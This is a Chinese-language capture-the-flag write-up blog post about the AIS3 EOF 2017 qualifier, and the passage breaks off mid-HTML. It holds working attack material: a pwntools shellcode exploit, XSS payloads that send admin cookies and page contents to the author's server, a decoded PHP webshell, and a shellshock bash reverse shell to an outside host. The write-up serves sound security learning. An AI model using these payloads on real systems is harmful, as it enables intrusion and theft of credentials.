@@ -1,0 +1,691 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" >
+  <title>AIS3 EOF CTF 初賽 | Kaibro&#39;s blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <!--<link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/earlyaccess/notosanstc.css">-->
+  <meta name="description" content="前言這場比賽是跟台大、交大、台科大三校的計算機安全課程期末考一起辦的 然後任何人都可以報名參加 前十名的隊伍可以進決賽 Pwn由於我們這隊基本上沒人熟Heap 囧 我也只摸了幾題課程網站的練習題 所以Pwn的解題狀況蠻慘的 Magicheap2這種一堆人解掉的題目，我們就解不出來">
+<meta name="keywords" content="Web,CTF,Pwn,NTU">
+<meta property="og:type" content="article">
+<meta property="og:title" content="AIS3 EOF CTF 初賽">
+<meta property="og:url" content="http://blog.kaibro.tw/2018/01/16/AIS3-EOF-2017-初賽/index.html">
+<meta property="og:site_name" content="Kaibro&#39;s blog">
+<meta property="og:description" content="前言這場比賽是跟台大、交大、台科大三校的計算機安全課程期末考一起辦的 然後任何人都可以報名參加 前十名的隊伍可以進決賽 Pwn由於我們這隊基本上沒人熟Heap 囧 我也只摸了幾題課程網站的練習題 所以Pwn的解題狀況蠻慘的 Magicheap2這種一堆人解掉的題目，我們就解不出來">
+<meta property="og:updated_time" content="2018-02-26T07:57:33.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="AIS3 EOF CTF 初賽">
+<meta name="twitter:description" content="前言這場比賽是跟台大、交大、台科大三校的計算機安全課程期末考一起辦的 然後任何人都可以報名參加 前十名的隊伍可以進決賽 Pwn由於我們這隊基本上沒人熟Heap 囧 我也只摸了幾題課程網站的練習題 所以Pwn的解題狀況蠻慘的 Magicheap2這種一堆人解掉的題目，我們就解不出來">
+  
+    <link rel="alternative" href="/atom.xml" title="Kaibro&#39;s blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+			<img src="/img/head.jpg" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/">KaiBro</a></h1>
+		</hgroup>
+
+		
+
+		
+			<div class="switch-btn">
+				<div class="icon">
+					<div class="icon-ctn">
+						<div class="icon-wrap icon-house" data-idx="0">
+							<div class="birdhouse"></div>
+							<div class="birdhouse_holes"></div>
+						</div>
+						<div class="icon-wrap icon-ribbon hide" data-idx="1">
+							<div class="ribbon"></div>
+						</div>
+						
+						
+						<div class="icon-wrap icon-me hide" data-idx="3">
+							<div class="user"></div>
+							<div class="shoulder"></div>
+						</div>
+						
+					</div>
+					
+				</div>
+				<div class="tips-box hide">
+					<div class="tips-arrow"></div>
+					<ul class="tips-inner">
+						<li>Menu</li>
+						<li>標籤</li>
+						
+						
+						<li>關於</li>
+						
+					</ul>
+				</div>
+			</div>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">主頁</a></li>
+				        
+							<li><a href="/archives">所有文章</a></li>
+				        
+							<li><a href="http://cv.kaibro.tw/">關於我</a></li>
+				        
+							<li><a href="http://blog.30cm.club/">New Blog</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+								<a class="github" target="_blank" href="https://github.com/w181496" title="github">github</a>
+					        
+								<a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
+					        
+								<a class="facebook" target="_blank" href="https://www.facebook.com/w181496" title="facebook">facebook</a>
+					        
+								<a class="twitter" target="_blank" href="https://twitter.com/KAIKAIBRO" title="twitter">twitter</a>
+					        
+						</div>
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						<a href="/tags/BugBounty/" style="font-size: 11.67px;">BugBounty</a> <a href="/tags/CTF/" style="font-size: 18.33px;">CTF</a> <a href="/tags/DEFCON/" style="font-size: 13.33px;">DEFCON</a> <a href="/tags/Java/" style="font-size: 13.33px;">Java</a> <a href="/tags/Linux/" style="font-size: 11.67px;">Linux</a> <a href="/tags/NCU/" style="font-size: 15px;">NCU</a> <a href="/tags/NTU/" style="font-size: 11.67px;">NTU</a> <a href="/tags/Pwn/" style="font-size: 16.67px;">Pwn</a> <a href="/tags/Web/" style="font-size: 18.33px;">Web</a> <a href="/tags/筆記/" style="font-size: 20px;">筆記</a> <a href="/tags/開箱/" style="font-size: 10px;">開箱</a> <a href="/tags/開箱文/" style="font-size: 10px;">開箱文</a>
+					</div>
+				</section>
+				
+				
+				
+
+				
+				
+				<section class="switch-part switch-part3">
+				
+					<div id="js-aboutme">Web security菜雞</div>
+				</section>
+				
+			</div>
+		</div>
+	</header>				
+</div>
+
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide">KaiBro</h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+			
+				<img src="/img/head.jpg" class="js-avatar">
+			
+			</div>
+			<hgroup>
+			  <h1 class="header-author">KaiBro</h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">主頁</a></li>
+		        
+					<li><a href="/archives">所有文章</a></li>
+		        
+					<li><a href="http://cv.kaibro.tw/">關於我</a></li>
+		        
+					<li><a href="http://blog.30cm.club/">New Blog</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+						<a class="github" target="_blank" href="https://github.com/w181496" title="github">github</a>
+			        
+						<a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
+			        
+						<a class="facebook" target="_blank" href="https://www.facebook.com/w181496" title="facebook">facebook</a>
+			        
+						<a class="twitter" target="_blank" href="https://twitter.com/KAIKAIBRO" title="twitter">twitter</a>
+			        
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+
+      <div class="body-wrap"><article id="post-AIS3-EOF-2017-初賽" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/01/16/AIS3-EOF-2017-初賽/" class="article-date">
+  	<time datetime="2018-01-15T16:53:52.000Z" itemprop="datePublished">2018-01-16</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      AIS3 EOF CTF 初賽
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="tags/Web/" class="js-tag article-tag-list-link color4">Web</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="tags/CTF/" class="js-tag article-tag-list-link color4">CTF</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="tags/Pwn/" class="js-tag article-tag-list-link color4">Pwn</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="tags/NTU/" class="js-tag article-tag-list-link color4">NTU</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+        
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="u524D_u8A00"><a href="#u524D_u8A00" class="headerlink" title="前言"></a>前言</h2><p>這場比賽是跟台大、交大、台科大三校的計算機安全課程期末考一起辦的</p>
+<p>然後任何人都可以報名參加</p>
+<p>前十名的隊伍可以進決賽</p>
+<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><p>由於我們這隊基本上沒人熟Heap 囧</p>
+<p>我也只摸了幾題課程網站的練習題</p>
+<p>所以Pwn的解題狀況蠻慘的</p>
+<p><code>Magicheap2</code>這種一堆人解掉的題目，我們就解不出來</p>
+<a id="more"></a>
+<h3 id="writeme"><a href="#writeme" class="headerlink" title="writeme"></a>writeme</h3><p>這題可以把你輸入位址的值印出來</p>
+<p>然後可以蓋掉這個位址的值</p>
+<p>整個就很水，輕鬆任意讀寫</p>
+<p>直接Hijack got就行惹</p>
+<p>(印出puts got內容算libc base，然後蓋成One gadget)</p>
+<h3 id="Bingo"><a href="#Bingo" class="headerlink" title="Bingo"></a>Bingo</h3><p>這題洞還蠻明顯的</p>
+<p>可是我們在最後一步一直鬼打牆</p>
+<p>所以我第三天一直在搞這題，然後就沒時間碰其他題惹QQ</p>
+<p>首先，因為這題rand用同個seed</p>
+<p>所以每次bingo的答案都一樣</p>
+<p><br></p>
+<p>然後這題沒開DEP，所以可以跳到Stack上執行</p>
+<p>又剛好的，他輸出Bingo的地方是用<code>%s</code></p>
+<p>只要不讓他有NULL Byte，就可以leak stack位址</p>
+<p>看到這邊，就很直覺想到，塞shellcode進去Bingo buffer</p>
+<p>然後最後再跳到這個Buffer上執行就可惹</p>
+<p>但是這題有個麻煩的地方</p>
+<p>就是他一次輸入4 bytes，輸入16次</p>
+<p>但是他會做NumberCheck</p>
+<p>先把4 bytes用<code>atoi()</code>轉成數字</p>
+<p>然後會檢查這個數字有沒有出現過、有沒有介於0 ~ 200</p>
+<p>這邊因為atoi的關係，前面一定要塞數字(或<code>+</code>, <code>-</code>)讀出來才不會是0</p>
+<p>e.g. <code>atoi(&quot;abc5566&quot;) = 0</code>、<code>atoi(&quot;123abc&quot;) = 123</code>、<code>atoi(&quot; \r\t87&quot;) = 87</code></p>
+<p><br><br>只要讓16個數字中的8個數字對，剩下都可以隨便填符合check的字元</p>
+<p>再加上他最後會從<code>buffer[60]</code>讀24 Bytes，其中到return address的padding是12 bytes</p>
+<p>但是因為12 Bytes太短，勢必一定要構造一段去填前面的部分，就要湊到符合numbercheck</p>
+<p>我們最主要就卡在這邊的構造shellcode (可能平常練太少QQ</p>
+<p>後來找了一個21 bytes的shellcode來改</p>
+<p>有幾個關鍵：</p>
+<ol>
+<li><p>其中一次輸入的4個Bytes可以全部都不為數字(會被當成0)</p>
+</li>
+<li><p>因為Buffer在stack上，所以shellcode的<code>push/pop</code>可能搞壞shellcode buffer</p>
+</li>
+<li><p>有一些數字開頭的指令(有的沒用到可以當成NOP)</p>
+</li>
+</ol>
+<p>例如：</p>
+<p><code>\x32\x3e</code> =&gt; <code>xor bh,BYTE PTR [rsi]</code></p>
+<p><code>\x34\x35</code> =&gt; <code>xor al,0x35</code></p>
+<p><code>\x32\x36</code> =&gt; <code>xor dh,BYTE PTR [rsi]</code></p>
+<p><code>\x32\x38</code> =&gt; <code>xor bh,BYTE PTR [rax]</code></p>
+<p><code>\x31\xf6</code> =&gt; <code>xor esi,esi</code></p>
+<p>塞這種在開頭，後面就能多串2 Bytes shellcode</p>
+<p>或是例如<code>\x34\x35</code>就可以串成：<code>XXX\x34</code>+<code>\x35YYY</code>，其對應<code>0</code>和<code>5</code> (X和Y為非數字)</p>
+<p>某些狀況也可以用「1 Byte」的指令，例如：</p>
+<p><code>\x5c</code> =&gt; <code>pop rsp</code></p>
+<p><code>\x5d</code> =&gt; <code>pop rbp</code></p>
+<p>根據以上幾點，改一下21 bytes的<code>execve(&quot;/bin//sh&quot;)</code>的shellcode就能拿shell惹</p>
+<p>不過我們最後是沒有拿到這一題的分數啦</p>
+<p>為啥？ 因為我比完10分鐘才拿到shell啊  </p>
+<p>崩╰(〒皿〒)╯潰</p>
+<p>Debug速度太慢+上電腦剛好爛掉，比完才發現syscall時rsi忘記清乾淨</p>
+<p>改了2 Bytes，換成<code>\x31\xf6</code>就成功拿到shell惹</p>
+<p>exploit:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> random</div><div class="line"></div><div class="line">r = remote(<span class="string">"35.201.132.60"</span>, <span class="number">12001</span>)</div><div class="line"></div><div class="line">nop = <span class="string">"\x32\x2e"</span></div><div class="line">nop2 = <span class="string">"\x34\x35"</span></div><div class="line">nop3 = <span class="string">"\x32\x36"</span></div><div class="line">nop4 = <span class="string">"\x32\x38"</span></div><div class="line">pop_rbp = <span class="string">"\x5d"</span></div><div class="line">xor_esi_esi = <span class="string">"\x31\xf6"</span> <span class="comment"># xor esi, esi</span></div><div class="line"></div><div class="line"><span class="comment"># original shellcode: \xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05</span></div><div class="line">payload = <span class="string">"87"</span> + pop_rbp + nop3 + pop_rbp + <span class="string">"\xf7\xe6"</span> + xor_esi_esi + <span class="string">"\x48\xbf\x2f\x62\x69\x6e126 \x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"</span></div><div class="line"></div><div class="line">r.sendline(<span class="string">"183"</span>) <span class="comment"># 1</span></div><div class="line">r.sendline(<span class="string">"86"</span>) <span class="comment"># 2</span></div><div class="line">r.sendline(<span class="string">"177"</span>) <span class="comment"># 3</span></div><div class="line">r.sendline(<span class="string">"115"</span>) <span class="comment"># 4</span></div><div class="line">r.sendline(<span class="string">"193"</span>) <span class="comment"># 5</span></div><div class="line">r.sendline(<span class="string">"135"</span>) <span class="comment"># 6</span></div><div class="line">r.sendline(<span class="string">"186"</span>) <span class="comment"># 7</span></div><div class="line">r.sendline(<span class="string">"92"</span>) <span class="comment"># 8</span></div><div class="line">r.sendline(<span class="string">"49"</span>) <span class="comment"># 9</span></div><div class="line">r.sendline(<span class="string">"21"</span>) <span class="comment"># 10</span></div><div class="line">r.sendline(<span class="string">"162"</span>) <span class="comment"># 11</span></div><div class="line">r.send(payload)</div><div class="line"></div><div class="line">r.recvuntil(<span class="string">"126 "</span>) <span class="comment"># use 4 bytes to leak stack address</span></div><div class="line">s = u64(r.readline()[:<span class="number">8</span>].strip().ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</div><div class="line"><span class="keyword">print</span> <span class="string">"Stack: "</span>, hex(s)</div><div class="line"></div><div class="line">target = s - <span class="number">64</span> + <span class="number">11</span> * <span class="number">3</span> - <span class="number">3</span></div><div class="line"><span class="keyword">print</span> <span class="string">"Target: "</span>,hex(target)</div><div class="line">r.send(p64(target) + <span class="string">"aaaa"</span>)</div><div class="line">sleep(<span class="number">0.1</span>)</div><div class="line">r.interactive()</div></pre></td></tr></table></figure>
+<p><code>FLAG{THIS_challenge_is_too_easy_QQ}</code></p>
+<p>Update:</p>
+<p>這題其實不用這麼麻煩 (全世界應該只有我這樣解吧…</p>
+<p>shellcode直接寫read(12 bytes長度夠寫)，然後讓他寫在stack接下去的地方</p>
+<p>這樣就不用管啥numbercheck或長度限制惹 QQ</p>
+<p><br></p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>Web部分主要是我負責的</p>
+<p>其他人對這領域也幾乎不熟</p>
+<p>但是我平常沒啥在碰前端，因為不太喜歡javascript (X</p>
+<p>所以看到一堆XSS題，也是一個傻眼貓咪</p>
+<p>然後也沒人可以討論QQ</p>
+<h3 id="xssme"><a href="#xssme" class="headerlink" title="xssme"></a>xssme</h3><p>這題一開始我卡在輸入驗證碼的地方</p>
+<p>我以為要自己寫code算 (懶</p>
+<p>沒想到旁邊那個按鈕點下去就會開始算惹</p>
+<p>這題很多地方都可以XSS，例如username顯示的地方和寄信的內容</p>
+<p>可是我們主要是要XSS admin，但信件的usernmae不能XSS</p>
+<p>所以目標很明確是在內容部分</p>
+<p>比較麻煩的地方是，這題擋了很多東西，例如：</p>
+<p><code>&lt;script</code>, <code>&lt;iframe</code>, <code>innerHTML</code>, <code>)</code>, <code>}</code>, <code>.open</code>, <code>document.write</code>, <code>onerror</code>, <code>XMLHttprequest</code>…</p>
+<p>我自己繞的方法是：</p>
+<p><code>&lt;svg/onload=&quot;XXX&quot;&gt;</code>  XXX可以塞javascript</p>
+<p>所以為了leak admin cookie，就要想辦法把資料傳出來</p>
+<p>我的payload:</p>
+<p><code>&lt;svg/onload=&quot;document.location=&#39;http://kaibro.tw/log.php?c=&#39;+document.cookie&quot;&gt;</code></p>
+<p>這樣admin看到就會跳轉到我的Server，並夾帶cookie當參數</p>
+<p>我只要去Server收log就行惹</p>
+<p>拿到之後，可以看到cookie中就有這題的flag惹</p>
+<p><code>FLAG{Sometimes, XSS can be critical vulnerability &lt;script&gt;alert(1)&lt;/script&gt;}</code></p>
+<h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><p>這題打開來，會看到一堆空白行</p>
+<p>拉到最底，可以看到一段php code</p>
+<p>主要就是解密一段字串，然後執行</p>
+<p>一般webshell為了掩人耳目，時常會這樣子簡單的加密</p>
+<p>這邊要還原回去很簡單，把前面的<code>eval</code>改成<code>echo</code></p>
+<p>就會把解密出的code印出來</p>
+<p>大概長這樣:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">run</span><span class="params">()</span> </span></div><div class="line">&#123; </div><div class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'sig'</span>])) &#123; </div><div class="line">        $cmd = hash(<span class="string">'SHA512'</span>, $_SERVER[<span class="string">'REMOTE_ADDR'</span>]) ^ (string)$_GET[<span class="string">'cmd'</span>]; </div><div class="line">        $key = $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>] . sha1($_SERVER[<span class="string">'HTTP_HOST'</span>]); </div><div class="line">        $sig = hash_hmac(<span class="string">'SHA512'</span>, $cmd, $key); </div><div class="line">        <span class="keyword">if</span>($sig === (string)$_GET[<span class="string">'sig'</span>]) &#123; </div><div class="line">            header(<span class="string">'Content-Type: text/plain'</span>); </div><div class="line">            <span class="keyword">return</span> !!system($cmd); </div><div class="line">        &#125; </div><div class="line">    &#125; </div><div class="line">    <span class="keyword">return</span> <span class="keyword">false</span>; </div><div class="line">&#125; </div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">fuck</span><span class="params">()</span> </span>&#123; </div><div class="line">    <span class="keyword">print</span>(str_repeat(<span class="string">"\n"</span>, <span class="number">4096</span>)); </div><div class="line">    readfile($_SERVER[<span class="string">'SCRIPT_FILENAME'</span>]); </div><div class="line">&#125; </div><div class="line"></div><div class="line">run() ?: fuck();</div></pre></td></tr></table></figure>
+<p>很明顯的，run的部分是webshell的密碼部分</p>
+<p>要想辦法輸入符合的密碼，才能執行command</p>
+<p>這裡他的<code>$cmd</code>變數是<code>SHA512(使用者IP) xor $_GET[&#39;cmd&#39;]</code></p>
+<p>然後<code>$key</code>是<code>UserAgent + SHA1(Server Host)</code></p>
+<p>最後我們輸入的<code>$_GET[&#39;sig&#39;]</code>要等於<code>hash_mac(&#39;SHA512&#39;, $cmd, $key)</code>才會跑<code>system($cmd)</code></p>
+<p>這裡的話，假設我們要執行的是<code>ls</code></p>
+<p>那代表<code>$cmd</code>，也就是<code>SHA512(使用者IP) xor $_GET[&#39;cmd&#39;]</code>要為<code>ls</code></p>
+<p>而對於同個使用者來說，IP可以暫且視為不變的，可控的部分為<code>$_GET[&#39;cmd&#39;]</code></p>
+<p>所以為了讓結果變成<code>ls</code>，我們要輸入的<code>$_GET[&#39;cmd&#39;]</code>為<code>SHA512(使用者IP) xor &#39;ls&#39;</code></p>
+<p>這邊XOR出來的結果可能是一些亂碼，輸出查看時可以先把他hex過</p>
+<p>要餵給Server時，可以用URL encode</p>
+<p>最後<code>$sig</code>的部分就很簡單，直接算<code>hash_mac(&#39;SHA512&#39;, $cmd, $key)</code>結果塞進去就行</p>
+<p>接著就是把flag讀出來就行</p>
+<p>我的產payload script:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$cmd = $_GET[<span class="string">'c'</span>];</div><div class="line">$s =  hash(<span class="string">'SHA512'</span>,$_SERVER[<span class="string">'REMOTE_ADDR'</span>]) ^ $cmd;</div><div class="line">$key = $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>] . sha1(<span class="string">"webshell.eof-ctf.ais3.ntu.st"</span>);</div><div class="line">$sig = hash_hmac(<span class="string">'SHA512'</span>, $cmd, $key);</div><div class="line"></div><div class="line"><span class="keyword">echo</span> <span class="string">"input sig: "</span>.$sig;</div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">"input cmd: "</span>.urlencode($s);</div></pre></td></tr></table></figure>
+<p><code>FLAG{Webshell? I only know sea shell~!}</code></p>
+<h3 id="command_executor"><a href="#command_executor" class="headerlink" title="command executor"></a>command executor</h3><p>這題的話，他是一個有很多功能的網頁</p>
+<p>大概有這些功能：</p>
+<ol>
+<li><p>執行<code>man</code>指令</p>
+</li>
+<li><p>上傳一個<code>tar</code>檔，然後test他，但不會解壓縮</p>
+</li>
+<li><p>執行<code>env</code>和<code>ls</code></p>
+</li>
+<li><p>ls list目錄</p>
+</li>
+</ol>
+<p>第一個踹的當然是Command Injection</p>
+<p>但很明顯擋掉惹</p>
+<p>然後看到上傳壓縮檔，我第一個直覺是之前某場比賽上傳symbolic link讀檔的招</p>
+<p>可是這邊他不會解壓縮，只有測試而已</p>
+<p>再來<code>env</code>和<code>ls</code>這個地方，很明顯是想暗示啥</p>
+<p>後來才知道是想告訴我們可以shellshock</p>
+<p>source code中<code>blacklist</code>的地方也有很明顯的暗示</p>
+<p>最後ls list目錄的地方，可以看到<code>/</code>下面有<code>flag-reader</code>和<code>flag</code></p>
+<p>很明顯是告訴我們要拿shell才讀得到</p>
+<p>然後這邊參數也可以<code>LFI</code>，可以用<code>php://filter</code>去讀source code</p>
+<p><code>https://command-executor.eof-ctf.ais3.ntu.st/index.php?func=php://filter/convert.base64-encode/resource=index</code></p>
+<p>把幾個php檔大致讀了一遍之後，似乎沒啥重大發現</p>
+<p>接著我就跑去踹man了</p>
+<p>我原本以為他想考<code>man -P /bin/cat /etc/passwd</code>可以執行指令XD</p>
+<p>可是看了Source Code後，發現應該不是這個思路</p>
+<p>踹了一下，又發現原來<code>man /etc/passwd</code>可以直接讀檔XDD</p>
+<p>翻箱倒櫃了一下，也沒發現啥東西</p>
+<p>後來才知道，要用shellshock去執行指令</p>
+<p>然後想辦法去成功跑<code>/flag-reader /flag</code> </p>
+<p>他裡面有很煩人的random value，要塞回去</p>
+<p><br></p>
+<p>不過</p>
+<p>這題我不是這樣拿到flag的</p>
+<p>我當初在解的時候，一直以為這題跟AIS3 jar一樣</p>
+<p>要上傳一個php，然後卡住連線，再去LFI它 (但我自己試是沒有成功啦QQ)</p>
+<p>所以那時候我就一直<code>ls /tmp</code>看有沒有人這樣搞XDD</p>
+<p>結果等了一陣子，還真的給我等到了</p>
+<p>出現了一個<code>k.php</code> (可能是某人拿了shell後寫入的)</p>
+<p>然後我直接LFI include它，奇蹟就發生了</p>
+<p>Flag就噴出來了 WTF XDDDDD</p>
+<p><code>FLAG{W0w U sh0cked m3 by 5h3115h0ck}</code></p>
+<p>(我們這隊好像第二還第三個解掉這題的XD)</p>
+<p>而且那個人後來還不把那個php刪掉，我猜應該有一堆人看到</p>
+<p>不過我後來還是有自己玩一遍shellshock啦XD</p>
+<p>他有擋最常見的那種payload</p>
+<p>可是可以<code>() { :a; }; echo 1</code>塞個東西就繞過惹</p>
+<p><code>() { :a; }; /bin/bash -c &#39;/bin/bash -i &gt;&amp; /dev/tcp/kaibro.tw/5278 0&gt;&amp;1&#39;</code></p>
+<p>直接Reverse Shell</p>
+<p>然後就是想辦法塞/flag-reader的Random value回去惹</p>
+<p>塞回去就會噴flag惹</p>
+<h3 id="xssrf_leak"><a href="#xssrf_leak" class="headerlink" title="xssrf leak"></a>xssrf leak</h3><p>這題我第一天看到時</p>
+<p>就在猜測也許是<code>PhantomJS</code>前陣子那個漏洞</p>
+<p>(PhantomJS可以從它送來的Request判斷)</p>
+<p>Update: </p>
+<p>最後確認這題不是單純這樣而已XD </p>
+<p>我果然太天真惹QAQ</p>
+<p>重點好像是admin panel有地方可以SSRF</p>
+<p>然後可以用<code>file://</code>去讀</p>
+<p>就能把FLAG讀出來 再寄給user這樣</p>
+<p>然後我一直卡在繞不過他的過濾= =</p>
+<p>踹不到後面的東西，頂多讀到admin有set admin跟request而已</p>
+<p>我比賽中還真的沒想到能用HTML entity繞 囧</p>
+<p>所以我就一直用xssme那題的payload一直改、一直想辦法繞</p>
+<p>不過我後來是有成功用innerHTML構造出iframe:</p>
+<p><code>&lt;svg/onload=&quot;document.body.childNodes[1].\u0069nnerHTML=&#39;&lt;\u0069frame src=http://kaibro.tw/frame&gt;&lt;/iframe&gt;&#39;&quot;&gt;</code></p>
+<p>不過沒鳥用，比賽中沒繞掉括號，很多東西都不能用QQ</p>
+<p>第三天都在搞Pwn，最後還是沒解出來這題 慘QQ</p>
+<p><br></p>
+<p>Update2:</p>
+<p>後來無聊再去把這題解掉了</p>
+<p>我一樣是用<code>&lt;svg&gt;</code>的<code>onload</code>去執行javascript，然後發request到我的Server收log</p>
+<p>只是這邊因為使用<code>&amp;#xH;</code>(Hex)的形式會被解碼，所以我們直接把所有onload裡面的javascript code用這種方式編碼</p>
+<p>這樣直接輕鬆繞過過濾惹</p>
+<p>以下的Payload為了方便閱讀，我就用<code>&amp;#xH;</code>編碼前的樣子表示</p>
+<p>Payload:</p>
+<p><code>&lt;svg onload=&quot;document.location=&#39;http://kaibro.tw/log.php?c=&#39;+btoa(document.body.innerHTML)&quot;&gt;</code></p>
+<p>然後再把Server上收到的log做base64 decode，就能看到admin panel的樣子惹</p>
+<p>可以看到有<code>sentmail.php</code>, <code>setadmin.php</code>, <code>request.php</code>, <code>sendmail.php</code>, <code>mailbox.php</code></p>
+<p>比較特別的應該是<code>setadmin.php</code>和<code>request.php</code>這兩個</p>
+<p>但由於admin限制本機才能訪問，所以<code>setadmin.php</code>應該是沒啥用</p>
+<p>那<code>request.php</code>是啥</p>
+<p>用XHR就可以送Request去訪問這個頁面，就能看Response長啥樣惹</p>
+<p>Payload如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">"</span></span></div><div class="line">xmlhttp=new XMLHttpRequest();</div><div class="line">xmlhttp.onreadystatechange=function()</div><div class="line">&#123;</div><div class="line">    if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</div><div class="line">    &#123;</div><div class="line">        document.location='http://kaibro.tw/log.php?c='+btoa(xmlhttp.responseText);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">xmlhttp.open("<span class="attr">GET</span>","<span class="attr">request.php</span>",<span class="attr">true</span>);</div><div class="line"><span class="attr">xmlhttp.send</span>();</div><div class="line">"&gt;</div></pre></td></tr></table></figure>
+<p>可以看到頁面比較重要的部分大概長這樣：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"/request.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"url"</span>&gt;</span>URL<span class="tag">&lt;/<span class="name">label</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textarea</span> 